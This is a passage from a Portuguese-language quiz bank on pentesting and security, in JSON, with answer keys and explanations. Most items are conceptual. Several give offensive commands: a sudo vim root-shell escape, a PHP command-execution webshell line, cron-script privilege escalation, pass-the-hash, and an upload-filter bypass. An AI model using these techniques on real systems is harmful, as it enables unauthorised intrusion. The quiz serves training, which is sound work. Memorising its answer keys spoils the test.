      "CCNA",
      "Word",
      "ITIL"
    ],
    "answer": 0,
    "exp": "A certificação OSCP da Offensive Security é o padrão de excelência técnica com exame 100% prático e hands-on de 24 horas."
  },
  {
    "id": "h-149",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual a diferença entre pentest e Red Team?",
    "options": [
      "Pentest tem escopo/tempo definidos e foco em achados; Red Team simula adversário real, furtivamente, medindo detecção",
      "São idênticos",
      "Red Team não usa ferramentas",
      "Pentest é sempre ilegal"
    ],
    "answer": 0,
    "exp": "Pentest visa encontrar o máximo de falhas num escopo fixo; Red Team simula uma campanha adversary com foco em evasão, Blue Team e objetivos estratégicos."
  },
  {
    "id": "h-150",
    "cat": "Grey Hat & Ética",
    "q": "O que é \"vulnerability disclosure\" responsável?",
    "options": [
      "Reportar a vulnerabilidade ao responsável antes de divulgar publicamente, dando tempo para correção",
      "Postar o exploit no Twitter imediatamente",
      "Vender a vulnerabilidade",
      "Ignorar o achado"
    ],
    "answer": 0,
    "exp": "Responsible Disclosure (Coordinated Vulnerability Disclosure) notifica privadamente a empresa afetada, estipulando prazo razoável para emissão de patch."
  },
  {
    "id": "h-151",
    "cat": "Criptografia & Defesa",
    "q": "Qual a diferença entre criptografia simétrica e assimétrica?",
    "options": [
      "Simétrica usa a mesma chave para cifrar/decifrar; assimétrica usa par público/privado",
      "Assimétrica é sempre mais rápida",
      "Simétrica não usa chaves",
      "São a mesma coisa"
    ],
    "answer": 0,
    "exp": "Criptografia Simétrica (AES) usa a mesma chave secreta compartilhada; Criptografia Assimétrica (RSA/ECC) usa par de chaves pública e privada."
  },
  {
    "id": "h-152",
    "cat": "Criptografia & Defesa",
    "q": "Qual algoritmo é usado para assinaturas/troca de chaves (assimétrico)?",
    "options": [
      "RSA",
      "AES",
      "RC4",
      "MD5"
    ],
    "answer": 0,
    "exp": "RSA e algoritmos de Curva Elíptica (ECDSA) são assimétricos, permitindo autenticação e troca segura de chaves sem compartilhar segredos."
  },
  {
    "id": "h-153",
    "cat": "Criptografia & Defesa",
    "q": "Qual algoritmo é usado para criptografia de dados (simétrico)?",
    "options": [
      "AES",
      "RSA",
      "Diffie-Hellman",
      "ECDSA"
    ],
    "answer": 0,
    "exp": "Advanced Encryption Standard (AES) é o algoritmo simétrico padrão mundial para cifragem rápida e segura de dados volumosos em trânsito e repouso."
  },
  {
    "id": "h-154",
    "cat": "Criptografia & Defesa",
    "q": "O que é uma função hash?",
    "options": [
      "Função de mão única que gera resumo fixo dos dados (não é reversível)",
      "Um método de criptografia reversível",
      "Um tipo de firewall",
      "Uma técnica de compressão"
    ],
    "answer": 0,
    "exp": "Funções hash criptográficas (SHA-256) mapeiam dados de qualquer tamanho para uma sequência de tamanho fixo sem possibilidade matemática de reversão direta."
  },
  {
    "id": "h-155",
    "cat": "Criptografia & Defesa",
    "q": "Como senhas devem ser armazenadas corretamente num sistema?",
    "options": [
      "Com hash lento e sal (bcrypt, Argon2, scrypt)",
      "Em texto claro",
      "Com MD5 puro e sem sal",
      "Com Base64"
    ],
    "answer": 0,
    "exp": "Algoritmos modernos de hashing de senhas como Argon2 e bcrypt utilizam alto custo computacional, memória e salt para inviabilizar ataques por força bruta em GPU."
  },
  {
    "id": "h-156",
    "cat": "Criptografia & Defesa",
    "q": "O que é um \"salt\" no hash de senha?",
    "options": [
      "Valor aleatório adicionado ao hash para impedir rainbow tables e hashes iguais",
      "O nome do usuário",
      "Uma chave pública",
      "Um tipo de certificado"
    ],
    "answer": 0,
    "exp": "O salt garante que dois usuários com a mesma senha gerem hashes completamente distintos, neutralizando tabelas pré-computadas (Rainbow Tables)."
  },
  {
    "id": "h-157",
    "cat": "Senhas & Força Bruta",
    "q": "O que é ataque de rainbow table?",
    "options": [
      "Uso de tabelas pré-computadas de hash→senha",
      "Ataque DDoS colorido",
      "Interceptação Wi-Fi",
      "Phishing por e-mail"
    ],
    "answer": 0,
    "exp": "Rainbow Tables são estruturas de busca pré-calculadas que trocam espaço em disco por tempo para reverter hashes rápidos não salgados instantaneamente."
  },
  {
    "id": "h-158",
    "cat": "Criptografia & Defesa",
    "q": "HTTPS protege principalmente contra:",
    "options": [
      "Interceptação e modificação do tráfego em trânsito",
      "Senhas fracas",
      "SQL Injection",
      "Engenharia social"
    ],
    "answer": 0,
    "exp": "HTTPS cifra a camada de transporte com TLS, garantindo confidencialidade e integridade contra escutas (sniffing) e ataques man-in-the-middle na rede."
  },
  {
    "id": "h-159",
    "cat": "Metodologia & Fundamentos",
    "q": "O que significa a tríade CIA em segurança?",
    "options": [
      "Confidencialidade, Integridade, Disponibilidade",
      "Controle, Identidade, Acesso",
      "Criptografia, Intrusão, Automação",
      "Ciberataque, Impacto, Análise"
    ],
    "answer": 0,
    "exp": "CIA (Confidentiality, Integrity, Availability) é a base de toda a segurança da informação: proteger contra acesso não autorizado, alteração indevida e indisponibilidade."
  },
  {
    "id": "h-160",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual princípio diz que um usuário deve ter apenas as permissões necessárias?",
    "options": [
      "Least Privilege (menor privilégio)",
      "Defense in Depth",
      "Zero Trust",
      "CIA"
    ],
    "answer": 0,
    "exp": "Princípio do Menor Privilégio concede estritamente o acesso mínimo indispensável para que o usuário ou processo desempenhe sua função."
  },
  {
    "id": "h-161",
    "cat": "Metodologia & Fundamentos",
    "q": "O que é Defense in Depth?",
    "options": [
      "Múltiplas camadas de defesa (firewall + EDR + MFA, etc.)",
      "Um firewall específico",
      "Criptografia de disco",
      "Backup semanal"
    ],
    "answer": 0,
    "exp": "Defesa em Profundidade estrutura múltiplas barreiras de segurança redundantes, de forma que a quebra de uma camada não comprometa todo o ambiente."
  },
  {
    "id": "h-162",
    "cat": "Metodologia & Fundamentos",
    "q": "O que é Zero Trust?",
    "options": [
      "Nunca confiar automaticamente, sempre verificar identidade e contexto, mesmo internamente",
      "Confiar só na rede interna",
      "Remover todos os firewalls",
      "Um antivírus"
    ],
    "answer": 0,
    "exp": "A arquitetura Zero Trust parte do pressuposto de que ameaças já estão dentro da rede: 'Never Trust, Always Verify'."
  },
  {
    "id": "h-163",
    "cat": "Metodologia & Fundamentos",
    "q": "Qual é a diferença entre vulnerabilidade, exploit e threat?",
    "options": [
      "Vulnerabilidade = fraqueza; exploit = código que a abusa; threat = ameaça potencial",
      "São sinônimos",
      "Vulnerabilidade é o atacante",
      "Exploit é o antivírus"
    ],
    "answer": 0,
    "exp": "Vulnerabilidade é o defeito; Exploit é a ferramenta/técnica que o aproveita; Threat é o agente/risco com potencial de causar dano."
  },
  {
    "id": "h-164",
    "cat": "Metodologia & Fundamentos",
    "q": "O que é um \"zero-day\"?",
    "options": [
      "Vulnerabilidade sem patch disponível, desconhecida do fornecedor",
      "Virus criado hoje",
      "Senha expirada",
      "Backup diário"
    ],
    "answer": 0,
    "exp": "Zero-Day (0-day) é uma falha de segurança que ainda não possui correção emitida pelo fabricante e que pode estar sendo explorada ativamente."
  },
  {
    "id": "h-165",
    "cat": "Metodologia & Fundamentos",
    "q": "O que é um patch?",
    "options": [
      "Atualização de software que corrige vulnerabilidades",
      "Um tipo de malware",
      "Cabo de rede",
      "Wordlist"
    ],
    "answer": 0,
    "exp": "Patch é o pacote de atualização de código distribuído pelos desenvolvedores para corrigir bugs e fechar brechas de segurança."
  },
  {
    "id": "h-166",
    "cat": "Forense, Malware & Evasão",
    "q": "O que faz um EDR?",
    "options": [
      "Monitora e responde a comportamentos maliciosos nos endpoints",
      "Escaneia portas da rede",
      "Cria relatórios de pentest",
      "Gera hashes"
    ],
    "answer": 0,
    "exp": "Endpoint Detection and Response (EDR) monitora telemetria contínua em computadores e servidores para detectar e bloquear atividades anômalas de atacantes."
  },
  {
    "id": "h-167",
    "cat": "Wireless & Engenharia Social",
    "q": "O que é phishing?",
    "options": [
      "Mensagens fraudulentas que induzem a vítima a revelar credenciais ou clicar em links maliciosos",
      "Escaneamento de portas",
      "Ataque de força bruta",
      "Injeção de código"
    ],
    "answer": 0,
    "exp": "Phishing é uma técnica de engenharia social que engana destinatários simulando entidades legítimas (bancos, RH, TI) para roubar senhas ou infectar sistemas."
  },
  {
    "id": "h-168",
    "cat": "Wireless & Engenharia Social",
    "q": "Qual diferença entre phishing e spear phishing?",
    "options": [
      "Spear phishing é direcionado a um alvo específico, com contexto personalizado",
      "Não há diferença",
      "Spear phishing é só por telefone",
      "Phishing é sempre interno"
    ],
    "answer": 0,
    "exp": "Spear Phishing é altamente customizado para um indivíduo ou departamento específico, utilizando detalhes reais colhidos em OSINT para maximizar a credibilidade."
  },
  {
    "id": "h-169",
    "cat": "Wireless & Engenharia Social",
    "q": "O que é vishing?",
    "options": [
      "Phishing por telefone/voz",
      "Phishing por SMS",
      "Phishing por QR Code",
      "Roubo de Wi-Fi"
    ],
    "answer": 0,
    "exp": "Voice Phishing (Vishing) é a modalidade de engenharia social conduzida por chamadas telefônicas ou voz IP."
  },
  {
    "id": "h-170",
    "cat": "Wireless & Engenharia Social",
    "q": "O que é um ataque de \"shoulder surfing\"?",
    "options": [
      "Observar a tela/teclado de alguém para roubar informações",
      "Espionar a rede Wi-Fi",
      "Ataque físico ao servidor",
      "Phishing corporativo"
    ],
    "answer": 0,
    "exp": "Shoulder Surfing é a observação física direta sobre os ombros da vítima para capturar senhas, PINs ou documentos confidenciais na tela."
  },
  {
    "id": "h-171",
    "cat": "Wireless & Engenharia Social",
    "q": "Em pentests autorizados, a simulação de phishing é usada para:",
    "options": [
      "Medir a suscetibilidade dos colaboradores e treinar conscientização",
      "Roubar dinheiro de verdade",
      "Vender dados",
      "Derrubar o e-mail da empresa"
    ],
    "answer": 0,
    "exp": "Simulações de phishing corporativo medem o nível de maturidade humana e direcionam treinamentos de conscientização em segurança."
  },
  {
    "id": "h-172",
    "cat": "Wireless & Engenharia Social",
    "q": "O que é tailgating (piggybacking) em teste físico?",
    "options": [
      "Entrar atrás de um funcionário autorizado sem crachá",
      "Correr atrás do invasor",
      "Instalar um tail no Linux",
      "Monitorar logs"
    ],
    "answer": 0,
    "exp": "Tailgating consiste em seguir de perto um colaborador autorizado que abre uma porta com crachá para ingressar em áreas restritas sem autorização."
  },
  {
    "id": "h-173",
    "cat": "Labs & Treinamento",
    "q": "Por que rodar alvos vulneráveis em VMs/Docker é a forma correta de praticar?",
    "options": [
      "Isola os testes, evitando atingir sistemas reais (legal e seguro)",
      "Porque é mais rápido",
      "Porque o Docker criptografa tudo",
      "Não há motivo"
    ],
    "answer": 0,
    "exp": "Ambientes virtualizados isolados garantem total segurança jurídica e técnica, permitindo errar, quebrar e recriar máquinas sem riscos."
  },
  {
    "id": "h-174",
    "cat": "Labs & Treinamento",
    "q": "Qual comando roda o Juice Shop (app vulnerável) via Docker?",
    "options": [
      "docker run -d -p 3000:3000 bkimminich/juice-shop",
      "docker start juice",
      "apt install juice-shop",
      "pip install juice"
    ],
    "answer": 0,
    "exp": "O comando Docker baixa e inicializa a OWASP Juice Shop em background exposta na porta local 3000."
  },
  {
    "id": "h-175",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando faz o Kali atualizar a lista de pacotes?",
    "options": [
      "sudo apt update",
      "apt install --new",
      "kali update",
      "upgrade -y"
    ],
    "answer": 0,
    "exp": "'sudo apt update' atualiza os índices locais dos repositórios APT com as versões mais recentes das ferramentas de segurança."
  },
  {
    "id": "h-176",
    "cat": "Linux & Lab Setup",
    "q": "O VirtualBox é usado para:",
    "options": [
      "Rodar máquinas virtuais (Kali, Windows, VMs vulneráveis) no seu computador",
      "Escanear vulnerabilidades",
      "Criar wordlists",
      "Capturar tráfego"
    ],
    "answer": 0,
    "exp": "VirtualBox é o hipervisor open source mais acessível para montar laboratórios completos de pentest e Red Team localmente."
  },
  {
    "id": "h-177",
    "cat": "Linux & Lab Setup",
    "q": "Num lab em VirtualBox, qual modo de rede permite VM se comunicarem entre si e com o host, sem internet?",
    "options": [
      "Rede interna / Host-only",
      "Bridge",
      "NAT sempre",
      "Modo avião"
    ],
    "answer": 0,
    "exp": "Host-Only Network isola a rede virtual exclusivamente entre as máquinas virtuais e a máquina física, impedindo vazamento de pacotes para a internet."
  },
  {
    "id": "h-178",
    "cat": "Labs & Treinamento",
    "q": "O Metasploitable é:",
    "options": [
      "Uma VM Linux propositalmente cheia de vulnerabilidades para prática",
      "Um antivírus",
      "Um scanner pago",
      "Um sistema operacional de produção"
    ],
    "answer": 0,
    "exp": "Metasploitable (desenvolvido pela Rapid7) é uma máquina Linux criada com dezenas de serviços vulneráveis para treinamento de pentest."
  },
  {
    "id": "h-179",
    "cat": "Linux & Lab Setup",
    "q": "Snapshots (instantâneos) de VM servem em pentest lab para:",
    "options": [
      "Restaurar o ambiente rapidamente após bagunçar/quebrar o alvo",
      "Aumentar a RAM",
      "Acelerar o Wi-Fi",
      "Criar relatórios"
    ],
    "answer": 0,
    "exp": "Snapshots congelam o estado da máquina virtual, permitindo reverter qualquer dano acidental ou infecção de teste em segundos."
  },
  {
    "id": "h-180",
    "cat": "Linux & Lab Setup",
    "q": "Qual comando verifica o IP da sua máquina atacante no Kali?",
    "options": [
      "ip a ou ip addr",
      "whois",
      "ping me",
      "net view"
    ],
    "answer": 0,
    "exp": "'ip a' exibe os endereços atribuídos a interfaces locais (eth0, wlan0, tun0 para VPN de CTF)."
  },
  {
    "id": "h-181",
    "cat": "Web Hacking & Burp",
    "q": "O que faz o Nikto?",
    "options": [
      "Escaneia servidores web procurando arquivos perigosos, configurações antigas e problemas conhecidos",
      "Quebra hashes",
      "Monitora crons",
      "Gera payloads"
    ],
    "answer": 0,
    "exp": "Nikto é um scanner web clássico e abrangente que testa milhares de arquivos perigosos, versões desatualizadas de servidor e problemas de configuração."
  },
  {
    "id": "h-182",
    "cat": "Web Hacking & Burp",
    "q": "O feroxbuster se destaca do gobuster por:",
    "options": [
      "Ser escrito em Rust e fazer recursão automática de diretórios",
      "Ser mais lento",
      "Só funcionar no Windows",
      "Não usar wordlists"
    ],
    "answer": 0,
    "exp": "Feroxbuster é extremamente rápido por sua arquitetura multithread em Rust e capacidade nativa de recursão em diretórios encontrados."
  },
  {
    "id": "h-183",
    "cat": "Windows & Active Directory",
    "q": "O enum4linux serve para:",
    "options": [
      "Enumerar informações de sistemas Windows/SMB (usuários, shares, políticas)",
      "Enumerar diretórios web",
      "Quebrar senhas Linux",
      "Escanear Wi-Fi"
    ],
    "answer": 0,
    "exp": "enum4linux interage com portas SMB/NetBIOS (139/445) para listar usuários, grupos, compartilhamentos abertos e políticas de senha em hosts Windows."
  },
  {
    "id": "h-184",
    "cat": "Web Hacking & Burp",
    "q": "O que faz o wfuzz?",
    "options": [
      "Fuzzing de parâmetros, headers e valores em requisições web",
      "Captura de pacotes",
      "Escaneamento UDP",
      "Crack de WPA"
    ],
    "answer": 0,
    "exp": "wfuzz substitui a palavra FUZZ em qualquer ponto de uma requisição HTTP para testar injeções, nomes de parâmetros e valores ocultos."
  },
  {
    "id": "h-185",
    "cat": "OSINT & Recon",
    "q": "O whatweb identifica:",
    "options": [
      "Tecnologias usadas por um site (CMS, frameworks, servidores)",
      "Senhas do site",
      "Usuários do Windows",
      "Portas UDP"
    ],
    "answer": 0,
    "exp": "WhatWeb analisa assinaturas de mais de 1.800 plugins e tecnologias web, detectando bibliotecas JavaScript, versão do Apache, PHP e CMS."
  },
  {
    "id": "h-186",
    "cat": "Redes & Shells",
    "q": "O tcpdump é:",
    "options": [
      "Captura de pacotes via linha de comando",
      "Editor de texto",
      "Scanner web",
      "Gerador de certificados"
    ],
    "answer": 0,
    "exp": "tcpdump é o farejador de pacotes de terminal mais utilizado no Linux, ideal para monitorar portas e salvar tráfego em arquivos .pcap."
  },
  {
    "id": "h-187",
    "cat": "Metodologia & Fundamentos",
    "q": "O Searchsploit copia um exploit para o diretório atual com:",
    "options": [
      "searchsploit -m numero",
      "searchsploit --copy all",
      "exploit -get",
      "msf copy"
    ],
    "answer": 0,
    "exp": "A flag '-m' (mirror) copia o arquivo do exploit para o diretório de trabalho atual sem precisar navegar manualmente até /usr/share/exploitdb."
  },
  {
    "id": "h-188",
    "cat": "Windows & Active Directory",
    "q": "Para que serve o Impacket?",
    "options": [
      "Biblioteca Python com scripts para protocolos Windows (SMB, WMI, Kerberos)",
      "Escanear sites",
      "Quebrar Wi-Fi",
      "Criar VMs"
    ],
    "answer": 0,
    "exp": "Impacket (desenvolvido pela SecureAuth/Fortra) é a principal suite open source para interagir em baixo nível com protocolos de rede Windows."
  },
  {
    "id": "h-189",
    "cat": "Windows & Active Directory",
    "q": "Qual script do Impacket fornece shell interativo via SMB?",
    "options": [
      "psexec.py",
      "sqlmap.py",
      "hydra.py",
      "gobuster.py"
    ],
    "answer": 0,
    "exp": "psexec.py cria um serviço temporário no Windows via SMB e conecta via named pipes, concedendo shell interativo como NT AUTHORITY\\SYSTEM."
  },
  {
    "id": "h-190",
    "cat": "OSINT & Recon",
    "q": "O ExifTool é útil em OSINT para:",
    "options": [
      "Ver metadados de imagens/documentos (autor, GPS, software)",
      "Editar imagens",
      "Converter vídeos",
      "Escanear portas"
    ],
    "answer": 0,
    "exp": "ExifTool extrai metadados EXIF ocultos em fotos e PDFs, podendo expor coordenadas de GPS, modelo da câmera, autor e nomes de usuários corporativos."
  },
  {
    "id": "h-191",
    "cat": "Forense, Malware & Evasão",
    "q": "O que é forense digital?",
    "options": [
      "Coleta e análise de evidências digitais preservando sua integridade",
      "Criação de malware",
      "Teste de invasão",
      "Cópia ilegal de dados"
    ],
    "answer": 0,
    "exp": "Computação Forense é a ciência de identificar, coletar, preservar e analisar evidências digitais de incidentes para uso investigativo e judicial."
  },
  {
    "id": "h-192",
    "cat": "Forense, Malware & Evasão",
    "q": "O que é um hash MD5/SHA256 de um arquivo usado em forense?",
    "options": [
      "Verificar a integridade/identidade da evidência (que não foi alterada)",
      "Criptografar a evidência",
      "Compactar a evidência",
      "Ocultar a evidência"
    ],
    "answer": 0,
    "exp": "O cálculo de hash garante a Cadeia de Custódia: qualquer alteração de 1 bit na evidência muda completamente o hash, provando integridade pericial."
  },
  {
    "id": "h-193",
    "cat": "Forense, Malware & Evasão",
    "q": "O que é ransomware?",
    "options": [
      "Malware que criptografa os dados da vítima e exige resgate",
      "Antivírus avançado",
      "Firewall de rede",
      "Tipo de phishing sem malware"
    ],
    "answer": 0,
    "exp": "Ransomware sequestra arquivos corporativos através de criptografia assimétrica forte, exigindo pagamento em criptomoedas para liberar a chave."
  },
  {
    "id": "h-194",
    "cat": "Forense, Malware & Evasão",
    "q": "O que é um trojan?",
    "options": [
      "Malware disfarçado de software legítimo",
      "Cavalo de verdade em fileira digital",
      "Um exploit web",
      "Um tipo de firewall"
    ],
    "answer": 0,
    "exp": "Trojan (Cavalo de Troia) aparenta ser um programa inofensivo ou útil, mas esconde funcionalidades maliciosas em segundo plano."
  },
  {
    "id": "h-195",
    "cat": "Forense, Malware & Evasão",
    "q": "Qual a diferença entre malware e exploit?",
    "options": [
      "Malware é software malicioso completo; exploit é código que abusa de uma vulnerabilidade específica",
      "São idênticos",
      "Malware é sempre legal",
      "Exploit é um antivírus"
    ],
    "answer": 0,
    "exp": "O exploit é o aríete que abre a brecha de segurança; o malware é o programa completo de controle que pode ser instalado em seguida."
  },
  {
    "id": "h-196",
    "cat": "Forense, Malware & Evasão",
    "q": "O que significa \"IoC\" (Indicator of Compromise)?",
    "options": [
      "Artefatos observáveis que indicam intrusão (IP malicioso, hash de arquivo, domínio)",
      "Internet of Computers",
      "Tipo de certificado",
      "Ferramenta de pentest"
    ],
    "answer": 0,
    "exp": "Indicadores de Comprometimento (IoCs) são evidências forenses (IPs C2, chaves de registro, hashes) que comprovam que um sistema foi violado."
  },
  {
    "id": "h-197",
    "cat": "Forense, Malware & Evasão",
    "q": "O que faz um honeypot?",
    "options": [
      "Sistema isca que atrai atacantes para estudo e detecção",
      "Bloqueia ataques automaticamente",
      "Encripta a rede",
      "Gera senhas"
    ],
    "answer": 0,
    "exp": "Honeypots são ambientes deliberadamente expostos e monitorados para enganar invasores, desviá-los da produção e analisar suas táticas."
  },
  {
    "id": "h-198",
    "cat": "Grey Hat & Ética",
    "q": "O que é Bug Bounty?",
    "options": [
      "Programa que paga recompensas financeiras por vulnerabilidades encontradas, dentro das regras estabelecidas",
      "Programa de antivírus",
      "Curso de certificação",
      "Ferramenta de scan"
    ],
    "answer": 0,
    "exp": "Programas de Bug Bounty (HackerOne, Bugcrowd) conectam pesquisadores e empresas para remuneração legal e ética por falhas reportadas."
  },
  {
    "id": "h-199",
    "cat": "Grey Hat & Ética",
    "q": "Em Bug Bounty, o que é \"recon dentro do escopo\"?",
    "options": [
      "Enumerar apenas domínios/ativos explicitamente permitidos pelo programa",
      "Escanear qualquer site da empresa-mãe e subsidiárias sem verificar",
      "Atacar usuários por e-mail",
      "Invadir servidores de produção aos sábados"
    ],
    "answer": 0,
    "exp": "O escopo define estritamente quais subdomínios e serviços podem ser testados; testar fora do escopo desqualifica o pesquisador e constitui crime."
  },
  {
    "id": "h-200",
    "cat": "Grey Hat & Ética",
    "q": "Qual a melhor atitude ao encontrar uma vulnerabilidade num site real SEM autorização prévia?",
    "options": [
      "Não explorar; reportar responsavelmente se houver canal de disclosure, ou simplesmente não interagir mais",
      "Explorar para provar o achado",
      "Postar o detalhamento nas redes sociais",
      "Vender a informação"
    ],
    "answer": 0,
    "exp": "A ética hacker exige nunca explorar ou extrair dados sem autorização formal; deve-se cessar os testes e notificar o contato de segurança responsável."
  },
  {
    "id": "h-201",
    "cat": "Varredura & Nmap",
    "q": "Você rodou nmap -sV e encontrou \"vsftpd 2.3.4\" na porta 21. Qual o próximo passo mais lógico?",
    "options": [
      "Ignorar o serviço",
      "Buscar exploits conhecidos dessa versão (searchsploit vsftpd)",
      "Rodar John the Ripper",
      "Reiniciar o servidor alvo"
    ],
    "answer": 1,
    "exp": "A versão vsftpd 2.3.4 possui um infame backdoor histórico (CVE-2011-2523) que abre uma shell root na porta 6200 ao enviar ':)' no usuário."
  },
  {
    "id": "h-202",
    "cat": "Escalação de Privilégio",
    "q": "Qual comando encontra arquivos SUID em todo o sistema Linux?",
    "options": [
      "find / -perm -4000 2>/dev/null",
      "chmod -R 4000 /",
      "ls -s /",
      "grep suid /etc/passwd"
    ],
    "answer": 0,
    "exp": "'find / -perm -4000 2>/dev/null' pesquisa arquivos com permissão SUID ativada (modo 4000) e redireciona erros de permissão negada para /dev/null."
  },
  {
    "id": "h-203",
    "cat": "Metodologia & Fundamentos",
    "q": "No contexto de pentest, o que é \"exploitation\"?",
    "options": [
      "Ganho de acesso abusando de vulnerabilidades encontradas",
      "Apenas varredura de portas",
      "Redigir o relatório",
      "Instalar patches no alvo"
    ],
    "answer": 0,
    "exp": "Exploitation é a fase ativa em que se executa o código ou método de ataque para obter controle ou extrair dados do sistema alvo."
  },
  {
    "id": "h-204",
    "cat": "Escalação de Privilégio",
    "q": "O que faz sudo -l mostrar que o usuário pode rodar vim com NOPASSWD?",
    "options": [
      "Escalação para root é possível via GTFOBins (sudo vim -c ':!/bin/sh')",
      "Nada relevante",
      "O vim está quebrado",
      "O sistema é imune a escalação"
    ],
    "answer": 0,
    "exp": "Executar 'sudo vim -c \":!/bin/sh\"' abre uma shell dentro do editor vim que herda os privilégios totais de root."
  },
  {
    "id": "h-205",
    "cat": "Windows & Active Directory",
    "q": "Qual ferramenta enumera shares SMB e permissões com credenciais ou null session?",
    "options": [
      "smbmap",
      "sqlmap",
      "hashcat",
      "airmon-ng"
    ],
    "answer": 0,
    "exp": "smbmap permite listar diretórios compartilhados SMB e testar permissões de leitura (READ) e escrita (WRITE) em minutos."
  },
  {
    "id": "h-206",
    "cat": "Web Hacking & Burp",
    "q": "Um site retorna erro SQL ao colocar ' num parâmetro. O que isso sugere?",
    "options": [
      "Provável SQL Injection injetável",
      "O site está offline",
      "Certificado expirado",
      "Falha de DNS"
    ],
    "answer": 0,
    "exp": "Erros de sintaxe SQL revelam que a entrada não foi sanitizada e é passada diretamente para o motor do banco de dados (Error-based SQLi)."
  },
  {
    "id": "h-207",
    "cat": "Windows & Active Directory",
    "q": "Qual comando NetExec valida credenciais SMB num host Windows?",
    "options": [
      "nxc smb 192.168.1.10 -u user -p pass",
      "nxc scan --web",
      "nxc hash rockyou.txt",
      "nxc -vnc all"
    ],
    "answer": 0,
    "exp": "NetExec (nxc smb) testa credenciais via SMB, indicando se são válidas e se o usuário possui acesso administrativo (Pwn3d!)."
  },
  {
    "id": "h-208",
    "cat": "Web Hacking & Burp",
    "q": "O que é uma \"webshell\"?",
    "options": [
      "Script malicioso no servidor que executa comandos via navegador (ex.: em PHP)",
      "Um navegador seguro",
      "Um firewall web",
      "Um tipo de proxy"
    ],
    "answer": 0,
    "exp": "Webshells são scripts carregados no servidor web que fornecem uma interface de terminal ou execução remota através de chamadas HTTP."
  },
  {
    "id": "h-209",
    "cat": "Web Hacking & Burp",
    "q": "Qual instrução básica em PHP executa comandos enviados no parâmetro GET cmd?",
    "options": [
      "system($_GET['cmd']) encapsulado em tag PHP",
      "echo 'hello'",
      "include('config.php')",
      "alert(1)"
    ],
    "answer": 0,
    "exp": "A função system executa no terminal do sistema operacional o comando passado diretamente via parâmetro HTTP."
  },
  {
    "id": "h-210",
    "cat": "Web Hacking & Burp",
    "q": "O que significa RCE?",
    "options": [
      "Remote Code Execution — execução remota de código no alvo",
      "Remote Connection Enabled",
      "Root Certificate Encoder",
      "Rapid Cryptographic Engine"
    ],
    "answer": 0,
    "exp": "RCE é uma das falhas mais críticas em segurança, permitindo ao atacante executar instruções arbitrárias no servidor sem acesso físico."
  },
  {
    "id": "h-211",
    "cat": "Web Hacking & Burp",
    "q": "Qual resposta HTTP indica \"Not Found\"?",
    "options": [
      "404",
      "200",
      "403",
      "500"
    ],
    "answer": 0,
    "exp": "O código HTTP 404 indica que o recurso ou rota solicitada não foi encontrada no servidor."
  },
  {
    "id": "h-212",
    "cat": "Web Hacking & Burp",
    "q": "O que significa uma resposta HTTP 403 no diretório /admin?",
    "options": [
      "Acesso negado — mas o recurso existe; pode valer testes de bypass",
      "Página inexistente",
      "Erro do servidor",
      "Redirecionamento"
    ],
    "answer": 0,
    "exp": "O HTTP 403 Forbidden comprova que o recurso existe, abrindo espaço para testes de bypass de headers (X-Forwarded-For, X-Original-URL)."
  },
  {
    "id": "h-213",
    "cat": "Web Hacking & Burp",
    "q": "Qual código HTTP indica sucesso na requisição?",
    "options": [
      "200",
      "301",
      "404",
      "502"
    ],
    "answer": 0,
    "exp": "O status HTTP 200 OK confirma que a requisição foi processada com sucesso pelo servidor."
  },
  {
    "id": "h-214",
    "cat": "Web Hacking & Burp",
    "q": "O código HTTP 301 significa:",
    "options": [
      "Redirecionamento permanente",
      "Erro interno",
      "Não autorizado",
      "Timeout"
    ],
    "answer": 0,
    "exp": "HTTP 301 Moved Permanently indica que a URL foi movida definitivamente para outro endereço indicado no header Location."
  },
  {
    "id": "h-215",
    "cat": "Redes & Shells",
    "q": "Qual ferramenta faria MITM de tráfego HTTP numa rede local envenenando ARP com interface interativa moderna?",
    "options": [
      "Bettercap",
      "gobuster",
      "John",
      "Amass"
    ],
    "answer": 0,
    "exp": "Bettercap é o framework moderno em Go para ataques MITM em redes locais, BLE, Wi-Fi e interceptação de credenciais."
  },
  {
    "id": "h-216",
    "cat": "Windows & Active Directory",
    "q": "Você tem credenciais admin e WinRM aberto (5985) num host Windows. Melhor comando?",
    "options": [
      "evil-winrm -i [IP] -u admin -p [senha]",
      "sqlmap -u admin",
      "aircrack-ng winrm",
      "hydra --http 5985"
    ],
    "answer": 0,
    "exp": "evil-winrm é a melhor ferramenta para obter uma shell PowerShell interativa sobre o protocolo WinRM com credenciais válidas."
  },
  {
    "id": "h-217",
    "cat": "Windows & Active Directory",
    "q": "Você obteve um hash NTLM de um usuário. O que fazer?",
    "options": [
      "Tentar quebrar com hashcat -m 1000 ou usar pass-the-hash com Impacket",
      "Enviar por e-mail",
      "Converter para SHA-1",
      "Nada, hashes NTLM são inúteis"
    ],
    "answer": 0,
    "exp": "Hashes NTLM podem ser quebrados offline (Hashcat modo 1000) ou reutilizados diretamente sem decifrar via técnica Pass-the-Hash (PTH)."
  },
  {
    "id": "h-218",
    "cat": "Escalação de Privilégio",
    "q": "No Linux, /etc/crontab tem um job root rodando /opt/backup.sh, e você pode editar esse arquivo. O que fazer?",
    "options": [
      "Inserir um comando de shell ou permissão no script e aguardar o cron rodar",
      "Deletar o crontab",
      "Instalar um antivírus",
      "Rebootar o alvo"
    ],
    "answer": 0,
    "exp": "Scripts executados periodicamente pelo usuário root com permissão de escrita para usuários comuns são vetores imediatos de privilégio root."
  },
  {
    "id": "h-219",
    "cat": "Windows & Active Directory",
    "q": "Você encontrou um arquivo backup.sql num share SMB aberto. O que ele pode conter de valioso?",
    "options": [
      "Dumps de banco com usuários e hashes de senha",
      "Só estrutura de tabelas, nunca dados",
      "Nada relevante",
      "Apenas logs"
    ],
    "answer": 0,
    "exp": "Backups de banco de dados frequentemente expõem tabelas com credenciais, hashes de administradores e dados confidenciais."
  },
  {
    "id": "h-220",
    "cat": "Web Hacking & Burp",
    "q": "Um formulário de upload aceita .jpg mas valida só o Content-Type. Qual bypass?",
    "options": [
      "Enviar o webshell com Content-Type image/jpeg mantendo a extensão .php (ou double extension)",
      "Não há bypass",
      "Usar FTP",
      "Compactar em .zip"
    ],
    "answer": 0,
    "exp": "Se o servidor confia cegamente no cabeçalho Content-Type enviado pelo cliente sem validar o conteúdo real ou extensão, a restrição é contornada facilmente."
  },
  {
    "id": "h-221",
    "cat": "Web Hacking & Burp",
    "q": "Você ganhou shell como www-data num servidor web. Onde procurar credenciais primeiro?",
    "options": [
